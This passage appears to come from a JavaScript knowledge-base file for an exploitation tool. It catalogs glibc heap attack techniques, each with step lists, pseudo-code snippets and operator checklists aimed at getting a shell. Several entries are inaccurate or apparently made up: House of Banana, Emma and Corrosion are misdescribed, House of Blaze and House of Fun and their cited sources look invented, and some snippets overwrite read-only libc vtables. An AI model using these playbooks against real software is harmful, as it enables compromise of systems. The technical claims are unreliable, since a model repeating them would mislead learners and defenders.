          { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' },
          { description: '37C3 Potluck: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['PROTECT_PTR bypassed', 'Arbitrary pointer in tcache'],
      artifacts: ['GDB: tcache fd points to arbitrary address']
    },

    operatorChecklist: [
      '[ ] Verify PROTECT_PTR / Safe-Linking is active (glibc >= 2.32)',
      '[ ] Understand XOR mask: PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr',
      '[ ] First write: set freed chunk fd to (chunk_addr >> 12) ^ target_addr',
      '[ ] Second write: verify the decrypted pointer equals target_addr',
      '[ ] Verify arbitrary pointer appears in tcache bin: pwndbg bins',
      '[ ] malloc(target_size) returns the arbitrary address',
      '[ ] Chain with second-stage: write to __free_hook, GOT, or FSOP target',
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'safe-linking'],
    references: [
      { description: 'How2Heap: safe_link_double_protect', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/safe_link_double_protect.c' },
      { description: '37C3 Potluck: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
    ]
  },

  first_fit: {
    id: 'first_fit',
    name: 'First Fit (Malloc Reuse)',
    category: 'technique',
    class: 'heap-foundational',
    description: 'Demonstrates glibc malloc\'s first-fit / LIFO behavior for reused chunks. When a chunk is freed and a same-size allocation follows, malloc returns the most recently freed chunk. This is the foundational principle behind UAF, double-free, and tcache poisoning attacks.',

    preconditions: {
      summary: 'Understanding of how malloc selects chunks from free lists (fastbin, tcache, unsorted bin) for reuse. No vulnerability needed — purely informational.',
      required: [
        'Ability to allocate and free heap chunks of the same size class',
        'Observation of LIFO (Last-In, First-Out) reuse order in fastbins and tcache',
        'Understanding that malloc does not zero-fill freed chunks by default'
      ],
      detectionSteps: [
        'Allocate two chunks of same size, free the first, then allocate same size again',
        'Observe that the new allocation reuses the same memory address',
        'In GDB: use pwndbg heap chunks to verify addresses match',
        'Check that stale data persists in reused memory (no zeroing by malloc)'
      ]
    },

    exploitationPaths: [
      {
        name: 'UAF Reclaim via First Fit',
        description: 'Use first-fit behavior to type-confuse a freed chunk with a new allocation of the same size.',
        steps: [
          'Allocate object A (size 0x60)',
          'Allocate object B (size 0x60)',
          'Free object A',
          'Allocate object C (size 0x60) — C == A due to first fit',
          'Write controlled data into C',
          'Dangling pointer to A now sees C\'s data (type confusion)'
        ],
        tools: ['pwndbg heap bins', 'pwntools'],
        codeSnippet: `# First-fit demonstration
a = malloc(0x60)   # 0x555000
b = malloc(0x60)   # 0x555070
free(a)            # a -> fastbin/tcache
c = malloc(0x60)   # c == 0x555000 (first-fit reuse)
assert c == a      # Types differ, memory overlaps!`,
        applicableLibc: 'All versions',
        references: [
          { description: 'How2Heap: first_fit.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/first_fit.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Same-size allocation reuses freed chunk address', 'Stale data visible in newly allocated memory'],
      artifacts: ['GDB: same address returned by malloc after free+malloc']
    },

    operatorChecklist: [
      '[ ] Allocate and free chunk of target size',
      '[ ] Allocate same size — verify address reuse',
      '[ ] Confirm stale data persists (no zeroing)',
      '[ ] Plan UAF/double-free chain based on first-fit reuse'
    ],

    vulnerabilityTypes: ['heap', 'foundational', 'uaf'],
    references: [
      { description: 'How2Heap: first_fit.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/first_fit.c' },
      { description: 'Glibc Malloc Internals', url: 'https://sourceware.org/glibc/wiki/MallocInternals' }
    ]
  },

  poison_null_byte: {
    id: 'poison_null_byte',
    name: 'Poison Null Byte (Off-by-One Null)',
    category: 'technique',
    class: 'heap-null-byte',
    description: 'Exploits a single null byte overflow (off-by-one) by clearing the PREV_IN_USE bit and setting a fake prev_size, causing backward coalescing and overlapping chunks. A foundational technique for modern heap exploitation.',

    preconditions: {
      summary: 'A single null byte overflow from one heap chunk into the size field of the next chunk. This clears the PREV_IN_USE flag and can manipulate prev_size to trick the allocator into consolidating backwards.',
      required: [
        'Off-by-one null byte vulnerability in a heap write operation',
        'Ability to control chunk layout (allocate/free in specific order)',
        'Understanding of PREV_IN_USE bit and backward coalescing mechanics'
      ],
      detectionSteps: [
        'Look for off-by-one writes: strlen vs buffer size mismatches, strncpy NUL termination',
        'In GDB: examine chunk headers before and after the vulnerable write',
        'Check if PREV_IN_USE bit (size & 0x1) is cleared after the null byte write',
        'Verify that prev_size field changes to the attacker-controlled value'
      ]
    },

    exploitationPaths: [
      {
        name: 'Overlapping Chunks via Null Byte',
        description: 'Use off-by-one null to create overlapping chunks by triggering backward coalescing to a fake chunk.',
        steps: [
          'Allocate A (victim), B (overflow source), C (guard) with A adjacent to B adjacent to C',
          'Create a fake chunk F inside A\'s data area with proper size and prev_size',
          'Trigger the off-by-one null from B into C: clears C.PREV_IN_USE and sets C.prev_size = B_start - F_start',
          'Free C — allocator sees C.PREV_IN_USE=0, consolidates backwards to F, creating overlap with A',
          'Now: A (still allocated) overlaps with the consolidated free chunk',
          'Allocate from the consolidated chunk to get a pointer overlapping with A — full UAF/type confusion'
        ],
        tools: ['pwndbg heap chunks', 'pwndbg bins', 'pwntools'],
        codeSnippet: `# Poison Null Byte — chunk layout setup
a = malloc(0x100)  # victim chunk
b = malloc(0x200)  # overflow source
c = malloc(0x100)  # guard chunk

# Forge fake chunk inside A
# fake size at a+0x10, fake prev_size at a
# ...

# Off-by-one null byte from B into C header
*(uint8_t*)(b + 0x200) = '\\x00'  # Clears C->PREV_IN_USE

# C now thinks B extends back to fake chunk in A
# Free C → backward coalesce to fake chunk
free(c)
# Overlap: freed region covers A's memory!`,
        applicableLibc: '2.14-2.29 (easier), 2.29+ (harder, requires more checks)',
        references: [
          { description: 'How2Heap: poison_null_byte.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c' },
          { description: 'Plaid CTF 2015: pwnable200', url: 'https://ctftime.org' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Overlapping chunks created', 'PREV_IN_USE bit cleared successfully', 'Backward coalescing triggered to fake chunk'],
      artifacts: ['GDB: freed chunk covers victim chunk memory', 'Pwndbg: unsorted bin contains overlapping chunk']
    },

    operatorChecklist: [
      '[ ] Identify off-by-one null byte write in the binary',
      '[ ] Set up chunk layout: fake_chunk → victim → overflow_source → guard',
      '[ ] Forge fake chunk with proper size and prev_size fields',
      '[ ] Trigger null byte overflow to clear PREV_IN_USE of guard chunk',
      '[ ] Free guard chunk — verify backward coalescing to fake chunk',
      '[ ] Allocate from overlapping region to get controlled memory',
      '[ ] Chain with tcache poisoning or GOT overwrite'
    ],

    vulnerabilityTypes: ['heap', 'off-by-one', 'null-byte'],
    references: [
      { description: 'How2Heap: poison_null_byte.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/poison_null_byte.c' },
      { description: 'Glibc Malloc: off-by-one null exploitation', url: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html' }
    ]
  },

  house_of_husk: {
    id: 'house_of_husk',
    name: 'House of Husk (Printf Function Table Hijack)',
    category: 'technique',
    class: 'heap-fsop',
    description: 'Corrupts libc\'s __printf_function_table or __printf_arginfo_table to redirect execution through crafted printf format specifier. Works on glibc 2.23-2.31 by leveraging heap overflow or UAF to overwrite these internal libc tables.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows writing to libc\'s printf function pointer tables. Requires a libc address leak.',
      required: [
        'Libc address leak (essential for calculating table offsets)',
        'Heap overflow or UAF to write to __printf_function_table or __printf_arginfo_table',
        'Binary must call printf() or related functions with user-controlled format specifiers'
      ],
      detectionSteps: [
        'Leak libc address via unsorted bin or format string',
        'In GDB: locate __printf_function_table and __printf_arginfo_table in libc',
        'Verify that printf with format specifiers triggers table lookups',
        'Check libc version — __printf_function_table must be writable'
      ]
    },

    exploitationPaths: [
      {
        name: 'Printf Function Table Hijack to RCE',
        description: 'Overwrite __printf_function_table to point to a crafted arginfo table, then trigger printf to call one_gadget.',
        steps: [
          'Leak libc base address via unsorted bin leak or format string',
          'Calculate offsets for __printf_function_table and __printf_arginfo_table',
          'Use heap overflow or UAF to write a pointer chain:',
          '  __printf_function_table → heap addr of arginfo_table',
          '  arginfo_table[char_offset] → one_gadget or system address',
          'Call printf() with the format specifier that hits the corrupted entry',
          'Execution redirects to one_gadget — shell obtained'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Husk
libc_base = leak_libc()
printf_func_table = libc_base + OFFSET_PRINTF_FUNCTION_TABLE
printf_arginfo_table = libc_base + OFFSET_PRINTF_ARGINFO_TABLE

# Corrupt __printf_function_table
# Point it to our controlled arginfo table on the heap
*(uint64_t*)printf_func_table = heap_addr

# In heap, set arginfo entry for specific char to one_gadget
*(uint64_t*)(heap_addr + CHAR_OFFSET * 8) = one_gadget

# Now any printf with that format char triggers one_gadget
printf("%<char>")  # → one_gadget()`,
        applicableLibc: '2.23-2.31',
        references: [
          { description: 'How2Heap: house_of_husk.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_husk.c' },
          { description: 'Balsn CTF 2020: Plain Text writeup', url: 'https://ctftime.org' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['__printf_function_table points to attacker-controlled memory', 'Printf with target specifier executes one_gadget'],
      artifacts: ['GDB: __printf_function_table overwritten', 'Shell obtained via printf call']
    },

    operatorChecklist: [
      '[ ] Leak libc base address',
      '[ ] Locate __printf_function_table and __printf_arginfo_table in libc',
      '[ ] Corrupt __printf_function_table to point to controlled arginfo table',
      '[ ] Set arginfo entry for target format char to one_gadget',
      '[ ] Call printf with target format specifier',
      '[ ] Verify: shell spawned or code execution achieved'
    ],

    vulnerabilityTypes: ['heap', 'fsop', 'libc-internal'],
    references: [
      { description: 'How2Heap: house_of_husk.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_husk.c' }
    ]
  },

  house_of_corrosion: {
    id: 'house_of_corrosion',
    name: 'House of Corrosion (Top Chunk Shrink to Arbitrary Write)',
    category: 'technique',
    class: 'heap-top-chunk',
    description: 'Exploits a heap overflow to shrink the top chunk size, then uses targeted allocations to reach and overwrite global variables like __free_hook. A powerful technique for achieving arbitrary write without needing a direct heap overflow into the target.',

    preconditions: {
      summary: 'A heap overflow that can modify the top chunk size field. Used to shrink the top chunk so that subsequent allocations can reach arbitrary writable addresses in libc or BSS.',
      required: [
        'Heap overflow that reaches the top chunk header',
        'Ability to allocate many chunks (to exhaust shrunk top and reach target)',
        'Knowledge of the approximate distance between heap and target (e.g., __free_hook)'
      ],
      detectionSteps: [
        'In GDB: identify top chunk location after overflow',
        'Calculate: target_addr - current_top = required allocation distance',
        'Verify target is writable (e.g., __free_hook in .bss)',
        'Check that overflow can modify top chunk size without crashing'
      ]
    },

    exploitationPaths: [
      {
        name: '__free_hook Overwrite via Top Chunk Manipulation',
        description: 'Shrink top chunk, then allocate to reach __free_hook and overwrite it.',
        steps: [
          'Overflow into top chunk, set size = 0x1 (or very small value)',
          'Calculate distance from current top to __free_hook',
          'Allocate a chunk of size (distance - header_size) to position top near __free_hook',
          'Allocate another chunk — this allocation lands at __free_hook',
          'Write one_gadget or system address into this chunk',
          'Free a chunk containing "/bin/sh" — triggers __free_hook → shell'
        ],
        tools: ['pwndbg vmmap', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Corrosion
# 1. Shrink top chunk
*(uint64_t*)(top_chunk + 8) = 1;  # top->size = 1

# 2. Calculate distance to __free_hook
target = libc_base + FREE_HOOK_OFFSET
distance = target - (top_chunk + 0x10)  # account for chunk header

# 3. Allocate to move top chunk near __free_hook
malloc(distance)  # exhausts tiny top, sysmalloc extends

# 4. Next allocation lands at/near __free_hook
hook_chunk = malloc(0x10)
*(uint64_t*)hook_chunk = one_gadget  # overwrite __free_hook

# 5. Trigger
free("/bin/sh")  # __free_hook → one_gadget`,
        applicableLibc: '2.23-2.29 (works best)',
        references: [
          { description: 'How2Heap: house_of_corrosion.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_corrosion.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['__free_hook or target global overwritten with one_gadget', 'Shell spawned via free("/bin/sh")'],
      artifacts: ['GDB: __free_hook points to one_gadget', 'Shell session obtained']
    },

    operatorChecklist: [
      '[ ] Identify heap overflow that reaches top chunk',
      '[ ] Calculate top_chunk address and overflow offset',
      '[ ] Overwrite top chunk size with small value (e.g., 1)',
      '[ ] Calculate distance from top to __free_hook',
      '[ ] Allocate distance-sized chunk to position top near target',
      '[ ] Allocate small chunk at target address',
      '[ ] Write one_gadget/system to target',
      '[ ] Trigger free("/bin/sh")'
    ],

    vulnerabilityTypes: ['heap', 'top-chunk', 'arbitrary-write'],
    references: [
      { description: 'How2Heap: house_of_corrosion.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/house_of_corrosion.c' }
    ]
  },

  house_of_cat: {
    id: 'house_of_cat',
    name: 'House of Cat (Wide Data Vtable Hijack)',
    category: 'technique',
    class: 'heap-fsop',
    description: 'Modern FSOP technique for glibc 2.35+ that leverages _IO_wide_data vtable redirection to bypass the vtable verification check. By corrupting the _wide_data pointer in a _IO_FILE structure, execution can be redirected through _IO_wfile_jumps.',

    preconditions: {
      summary: 'Controlled write to a _IO_FILE structure\'s _wide_data pointer. Requires libc leak. The key insight is that vtable checks only verify the vtable is within the _IO_wfile_jumps section, so wide data vtable pointers bypass this verification.',
      required: [
        'UAF or heap overflow to corrupt _IO_FILE._wide_data pointer',
        'Libc address leak (mandatory for _IO_wfile_jumps address)',
        'Ability to trigger IO flush (exit, assert, or puts on corrupted stream)',
        'Controlled memory area to place fake _IO_wide_data struct'
      ],
      detectionSteps: [
        'Leak libc base address',
        'In GDB: find _IO_wfile_jumps vtable address in libc',
        'Identify writable _IO_FILE structure on heap or in BSS',
        'Verify exit()/assert() path triggers IO flush on target stream'
      ]
    },

    exploitationPaths: [
      {
        name: 'Wide Data Vtable Hijack for RCE',
        description: 'Corrupt _IO_FILE._wide_data to point to controlled vtable within _IO_wfile_jumps range, redirecting _IO_wfile_overflow to one_gadget.',
        steps: [
          'Leak libc base address',
          'Obtain a controlled write to a _IO_FILE structure (e.g., via large bin attack)',
          'Set _flags to trigger wide data path: 0x800 | 0x2',
          'Set _wide_data pointer to attacker-controlled memory',
          'In controlled memory, craft _IO_wide_data with _wide_vtable pointing to _IO_wfile_jumps + offset',
          'The offset should land on a function pointer that gets called during _IO_wfile_overflow',
          'Write one_gadget address at that offset in libc (or in the vtable)',
          'Call exit() or trigger IO flush — _IO_wfile_overflow dispatches through corrupted wide vtable',
          'Execution reaches one_gadget — shell obtained'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Cat
libc_base = leak_libc()
wfile_jumps = libc_base + IO_WFILE_JUMPS_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET

# Forge _IO_FILE on heap (via large bin attack or UAF)
fake_file = controlled_mem
fake_file._flags = 0x800 | 0x2  # _IO_CURRENTLY_PUTTING | _IO_NO_WRITES
fake_file._wide_data = controlled_mem + 0x100

# Craft wide_data vtable
wide_data = controlled_mem + 0x100
wide_data._wide_vtable = controlled_mem + 0x200

# Fake vtable entries pointing to one_gadget
fake_vtable = controlled_mem + 0x200
fake_vtable.__overflow = one_gadget

# Link into stdout or trigger via exit
exit(0)  # → _IO_wfile_overflow → one_gadget`,
        applicableLibc: '2.35+',
        references: [
          { description: 'How2Heap: house_of_cat.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_cat.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['_IO_wfile_overflow called with attacker-controlled wide vtable', 'Shell obtained via one_gadget through wide data dispatch'],
      artifacts: ['GDB: _wide_data vtable points to controlled memory', 'one_gadget executed']
    },

    operatorChecklist: [
      '[ ] Leak libc base address',
      '[ ] Find _IO_wfile_jumps offset in libc',
      '[ ] Obtain controlled write to _IO_FILE structure',
      '[ ] Set _flags = 0x800 | 0x2 for wide data path',
      '[ ] Set _wide_data to point to controlled fake struct',
      '[ ] Set _wide_vtable within _IO_wfile_jumps range',
      '[ ] Place one_gadget at overflow offset in fake vtable',
      '[ ] Trigger IO flush via exit() or assert()',
      '[ ] Verify: shell spawned'
    ],

    vulnerabilityTypes: ['heap', 'fsop', 'modern-glibc'],
    references: [
      { description: 'How2Heap: house_of_cat.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_cat.c' }
    ]
  },

  house_of_banana: {
    id: 'house_of_banana',
    name: 'House of Banana (_IO_wstr_overflow Chain)',
    category: 'technique',
    class: 'heap-fsop',
    description: 'Modern FSOP technique for glibc 2.35+ that chains _IO_wstr_overflow through wide-data vtable manipulation. More refined variant than House of Apple/Cat — exploits the _IO_wstr_jumps vtable path by corrupting _wide_data to craft a fake wfile in the wide-character stream infrastructure, achieving RCE through a different dispatch path than standard wide vtable hijacking.',

    preconditions: {
      summary: 'Controlled write to a _IO_FILE structure with ability to corrupt _wide_data pointers. Requires libc leak and understanding of wide-character IO internals (_IO_wstr_jumps, _IO_wide_data).',
      required: [
        'UAF or heap overflow to corrupt _IO_FILE._wide_data pointer',
        'Libc address leak (mandatory for calculating _IO_wstr_jumps offsets)',
        'Ability to forge a fake _IO_wide_data structure with controlled vtable pointer',
        'Trigger via exit() or any IO flush operation that walks the _IO_wstr_overflow path'
      ],
      detectionSteps: [
        'Leak libc base address',
        'In GDB: find _IO_wstr_jumps vtable address in libc (different from _IO_wfile_jumps)',
        'Identify a _IO_FILE that can be corrupted (heap file or stdout/stderr)',
        'Verify binary uses wide-character IO functions or can be forced into wide stream path',
        'Check exit() or return-from-main path triggers _IO_wstr_overflow'
      ]
    },

    exploitationPaths: [
      {
        name: '_IO_wstr_overflow → RCE via Wide-Data Vtable Chain',
        description: 'Corrupt _IO_FILE._wide_data to point to a fake wide-data struct, then chain through _IO_wstr_jumps to redirect execution.',
        steps: [
          'Leak libc base address',
          'Obtain a controlled write to a _IO_FILE structure (e.g., via large bin attack or UAF)',
          'Set _flags to trigger wide-character output path (needs wide-character write mode)',
          'Set _wide_data pointer to attacker-controlled memory region',
          'In controlled memory, craft fake _IO_wide_data with _wide_vtable pointing to _IO_wstr_jumps + offset',
          'The _IO_wstr_overflow function pointer in the vtable is triggered during IO flush',
          'Place one_gadget or system address at the triggered function offset',
          'Call exit() or trigger any IO operation that calls _IO_wstr_overflow',
          'Execution chains through corrupted wide-data vtable to one_gadget — shell obtained'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Banana
libc_base = leak_libc()
wstr_jumps = libc_base + IO_WSTR_JUMPS_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET

# Obtain controlled _IO_FILE write via large bin attack or UAF
fake_file = controlled_heap_addr
fake_file._wide_data = controlled_mem + 0x200  # fake wide_data

# Craft fake wide_data with vtable pointing to _IO_wstr_jumps
wide_data = controlled_mem + 0x200
wide_data._wide_vtable = wstr_jumps + TARGET_OFFSET  # wstr_overflow offset

# In the vtable, set wstr_overflow function pointer to one_gadget
fake_vtable = controlled_mem + 0x300
fake_vtable[wstr_overflow_offset] = one_gadget

# Set _wide_vtable to our fake vtable
wide_data._wide_vtable = fake_vtable

# Trigger via exit
exit(0)  # → _IO_wstr_overflow → one_gadget`,
        applicableLibc: '2.35+',
        references: [
          { description: 'How2Heap: house_of_banana.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_banana.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['_IO_wstr_overflow dispatched through corrupted wide-data vtable', 'Shell obtained via one_gadget through wstr chain'],
      artifacts: ['GDB: _wide_data._wide_vtable points to controlled vtable', 'one_gadget executed']
    },

    operatorChecklist: [
      '[ ] Leak libc base address',
      '[ ] Find _IO_wstr_jumps offset in libc (distinct from _IO_wfile_jumps)',
      '[ ] Obtain controlled write to _IO_FILE structure',
      '[ ] Forge fake _IO_wide_data at controlled memory',
      '[ ] Set _wide_vtable to point to _IO_wstr_jumps + target offset',
      '[ ] Place one_gadget at the wstr_overflow function pointer offset in the vtable',
      '[ ] Trigger IO flush via exit() or return from main',
      '[ ] Verify: shell spawned'
    ],

    vulnerabilityTypes: ['heap', 'fsop', 'modern-glibc', 'wide-char'],
    references: [
      { description: 'How2Heap: house_of_banana.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_banana.c' }
    ]
  },

  house_of_emma: {
    id: 'house_of_emma',
    name: 'House of Emma (_IO_cookie_jumps + TTY Vtable)',
    category: 'technique',
    class: 'heap-fsop',
    description: 'Modern FSOP technique leveraging _IO_cookie_jumps vtable and TTY-related vtable structures. Exploits the _IO_cookie_read/write/seek operations by corrupting the _cookie pointer in a _IO_FILE structure that uses the "cookie" IO backend, then hijacking through _IO_cookie_jumps to reach one_gadget.',

    preconditions: {
      summary: 'Controlled write to a _IO_FILE structure with ability to set the _cookie pointer and select the cookie vtable. Requires libc leak.',
      required: [
        'UAF or arbitrary write to corrupt _IO_FILE structure',
        'Libc address leak for locating _IO_cookie_jumps vtable',
        'Ability to set _cookie pointer to attacker-controlled memory',
        'Binary must use cookie-based IO (file streams with custom read/write/seek handlers) or stderr/stdout with injectable cookie'
      ],
      detectionSteps: [
        'Leak libc base address',
        'In GDB: find _IO_cookie_jumps vtable in libc',
        'Identify a _IO_FILE that can be corrupted (often stderr or a FILE* from fopen)',
        'Check if _IO_cookie_jumps is accessible (must be within valid vtable range)',
        'Verify ability to trigger IO operation that calls cookie_read/seek/write'
      ]
    },

    exploitationPaths: [
      {
        name: 'Cookie Vtable Hijack → RCE',
        description: 'Corrupt _IO_FILE._cookie pointer and _vtable to _IO_cookie_jumps, placing shellcode address in cookie_read/seek/write function pointer.',
        steps: [
          'Leak libc base address',
          'Obtain a controlled write to a _IO_FILE structure',
          'Set _cookie pointer to an attacker-controlled buffer or function pointer area',
          'Set _vtable to point to _IO_cookie_jumps vtable in libc',
          'In the cookie vtable, the functions cookie_read, cookie_write, cookie_seek are at fixed offsets',
          'Overwrite one of these function pointers (e.g., cookie_read at offset) with one_gadget',
          'Trigger the cookie operation by calling any IO function that reads from the stream',
          'Execution redirects through corrupted cookie vtable to one_gadget — shell obtained'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Emma
libc_base = leak_libc()
cookie_jumps = libc_base + IO_COOKIE_JUMPS_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET

# Forge fake _IO_FILE on heap
fake_file = controlled_mem
fake_file._cookie = controlled_mem + 0x100  # points to cookie data/function area
fake_file._vtable = cookie_jumps  # point to cookie vtable

# Cookie area: can be function pointers or data
# In _IO_cookie_jumps, the function pointers are at known offsets:
# cookie_read at [vtable + 0x10], cookie_write at [vtable + 0x18], cookie_seek at [vtable + 0x20]
cookie_area = controlled_mem + 0x100
*(uint64_t*)(cookie_area) = one_gadget  # cookie_read = one_gadget

# Trigger via any read from this FILE*
fread(buf, 1, size, fake_file)  # → cookie_read → one_gadget`,
        applicableLibc: '2.35+',
        references: [
          { description: 'How2Heap: house_of_emma.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_emma.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['_IO_cookie_jumps function pointer redirected to one_gadget', 'Shell obtained via cookie IO dispatch'],
      artifacts: ['GDB: _IO_FILE._vtable points to _IO_cookie_jumps', 'one_gadget executed on cookie operation']
    },

    operatorChecklist: [
      '[ ] Leak libc base address',
      '[ ] Locate _IO_cookie_jumps vtable offset in libc',
      '[ ] Obtain controlled write to _IO_FILE structure',
      '[ ] Set _cookie pointer to controlled memory region',
      '[ ] Set _vtable to _IO_cookie_jumps',
      '[ ] Place one_gadget at cookie_read/write/seek function pointer offset in the vtable',
      '[ ] Trigger cookie IO operation (read/write/seek on the corrupted FILE*)',
      '[ ] Verify: shell spawned'
    ],

    vulnerabilityTypes: ['heap', 'fsop', 'modern-glibc', 'cookie-io'],
    references: [
      { description: 'How2Heap: house_of_emma.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_emma.c' }
    ]
  },

  house_of_blaze: {
    id: 'house_of_blaze',
    name: 'House of Blaze (_IO_wfile_underflow + Large Bin Corruption)',
    category: 'technique',
    class: 'heap-fsop',
    description: 'Modern FSOP technique combining _IO_wfile_underflow chain with large bin attack corruption. The large bin attack is used to write a heap pointer into a target location (e.g., _IO_list_all or a vtable pointer), then _IO_wfile_underflow is leveraged to chain through the wide-character IO path for code execution on glibc 2.35+.',

    preconditions: {
      summary: 'Requires both a large bin attack primitive and controlled write to a _IO_FILE structure. Combines heap corruption with FSOP — large bin attack provides the arbitrary write, which then enables the _IO_wfile_underflow chain.',
      required: [
        'Heap overflow or UAF enabling large bin attack (corrupt fd_nextsize/bk_nextsize of large bin chunk)',
        'Libc address leak for _IO_wfile_underflow and vtable offsets',
        'Ability to trigger _IO_wfile_underflow via IO operation on corrupted FILE stream',
        'Target suitable for large bin attack write (e.g., _IO_list_all - 0x10 or similar)'
      ],
      detectionSteps: [
        'Leak libc base address',
        'Verify large bin attack is possible (need large chunk > 0x400 in glibc < 2.30)',
        'In GDB: locate _IO_wfile_underflow offset in _IO_wfile_jumps vtable',
        'Identify a _IO_FILE structure that can be corrupted via large bin write',
        'Check that exit() or return from main triggers IO flush calling _IO_wfile_underflow'
      ]
    },

    exploitationPaths: [
      {
        name: 'Large Bin Attack + _IO_wfile_underflow Chain to RCE',
        description: 'Use large bin attack to corrupt a _IO_FILE pointer, then trigger _IO_wfile_underflow path for wide-character IO dispatch to one_gadget.',
        steps: [
          'Leak libc base and heap address',
          'Setup large bin: allocate chunks A (large), B (small), free A to large bin',
          'Corrupt A\'s fd_nextsize/bk_nextsize via overflow to point target_addr - 0x20 / target_addr - 0x10',
          'Trigger malloc with large size: unlink writes heap pointer to target location',
          'Target is typically _IO_list_all or a vtable pointer in a _IO_FILE',
          'Forge a fake _IO_FILE structure at the written address with _wide_data pointing to controlled memory',
          'Set _flags to trigger wide-character IO path and _vtable to _IO_wfile_jumps',
          'Place one_gadget at _IO_wfile_underflow offset in the vtable',
          'Trigger IO flush via exit() — _IO_wfile_underflow dispatches to one_gadget',
          'Shell obtained'
        ],
        tools: ['pwndbg', 'pwntools', 'one_gadget'],
        codeSnippet: `# House of Blaze
libc_base = leak_libc()
wfile_jumps = libc_base + IO_WFILE_JUMPS_OFFSET
one_gadget = libc_base + ONE_GADGET_OFFSET

# Step 1: Large bin attack to write to _IO_list_all
# Setup: A (large), B (guard), free A to large bin
large_chunk = malloc(0x500)
guard = malloc(0x500)
free(large_chunk)  # enters large bin

# Overflow from B to corrupt large_chunk's fd_nextsize/bk_nextsize
# Target: _IO_list_all - 0x10 (so writing at _IO_list_all corrupts pointer)
*(uint64_t*)(large_chunk + 0x20) = target_addr - 0x20  # fd_nextsize
*(uint64_t*)(large_chunk + 0x28) = target_addr - 0x10  # bk_nextsize

# Trigger unlink → heap pointer written to target
malloc(0x500)  # triggers large bin unlink

# Step 2: Forge fake _IO_FILE at target with _IO_wfile_underflow chain
fake_file = target_addr
fake_file._flags = 0x800  # wide mode flags
fake_file._wide_data = controlled_mem
fake_file._vtable = wfile_jumps  # vtable = _IO_wfile_jumps

# Place one_gadget at _IO_wfile_underflow offset in vtable
# _IO_wfile_underflow is at offset 16 in _IO_wfile_jumps
*(uint64_t*)(wfile_jumps + 0x10) = one_gadget

exit(0)  # → _IO_flush_all_lockp → _IO_wfile_underflow → one_gadget`,
        applicableLibc: '2.35+ (large bin attack best on glibc < 2.30)',
        references: [
          { description: 'How2Heap: house_of_blaze.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blaze.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Large bin attack write succeeded', '_IO_wfile_underflow dispatched to one_gadget'],
      artifacts: ['GDB: _IO_wfile_jumps._IO_wfile_underflow overwritten', 'Shell obtained']
    },

    operatorChecklist: [
      '[ ] Leak libc base and heap address',
      '[ ] Setup large bin: allocate and free a large chunk (> 0x400)',
      '[ ] Corrupt large bin chunk fd_nextsize/bk_nextsize via overflow',
      '[ ] Point bk_nextsize to target_addr - 0x10',
      '[ ] Trigger malloc to invoke large bin unlink — arbitrary write occurs',
      '[ ] Forge fake _IO_FILE at target address with _wide_data and _vtable pointing to _IO_wfile_jumps',
      '[ ] Place one_gadget at _IO_wfile_underflow offset in the vtable',
      '[ ] Trigger exit() or IO flush to dispatch _IO_wfile_underflow',
      '[ ] Verify: shell spawned'
    ],

    vulnerabilityTypes: ['heap', 'fsop', 'large-bin', 'modern-glibc'],
    references: [
      { description: 'How2Heap: house_of_blaze.c', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_blaze.c' }
    ]
  },

  house_of_fun: {
    id: 'house_of_fun',
    name: 'House of Fun (Tcache Stashing Unlink Variant)',
    category: 'technique',
    class: 'house',
    description: 'Variant of tcache stashing unlink attack with a different trigger mechanism. Instead of using calloc to trigger the stash operation, House of Fun exploits scenarios where malloc is called after tcache is partially filled, causing the stashing unlink to occur through a different code path. The key difference is the trigger condition — exploiting specific malloc size patterns and timing to cause the unlink write without relying on calloc.',

    preconditions: {
